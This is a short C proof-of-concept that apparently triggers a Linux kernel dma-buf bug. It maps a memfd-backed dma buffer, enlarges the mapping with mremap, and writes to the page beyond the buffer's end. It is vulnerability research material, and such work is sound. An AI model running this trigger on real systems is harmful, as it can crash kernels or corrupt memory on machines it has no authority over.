#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#include "memfd_t.h"
#include "dma_buf_t.h"

#define N_PAGES 8
#define PAGE_SIZE 0x1000
#define errx(ret_code, msg) do{perror(msg); exit(ret_code);} while(0);

int main(int argc, char* argv[])
{
    printf("[+] creating memfd\n");
    memfd_t *memfd = memfd_t_create(PAGE_SIZE*N_PAGES);
    if(!memfd)
        errx(1, "[-] couldn't create memfd");

    printf("[+] creating dma buf\n");
    dma_buf_t *dma_buf = dma_buf_create(memfd);
    if(!dma_buf)
        errx(1, "[-] couldn't create dma buf");
    
    printf("[+] mapping dma buf\n");
    void* addr = mmap(NULL, dma_buf->size,
        PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->buf_fd, 0);
    if (addr == MAP_FAILED)
        errx(1, "[-] couldn't map memory");

    printf("[+] expanding dma buf by one page\n");
    void* remapped_addr = mremap(addr, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(remapped_addr==MAP_FAILED)
        errx(1, "[-] couldn't mremap memory");

    printf("[+] accessing OOB page\n");
    *((char*)remapped_addr+dma_buf->size) = 0;
}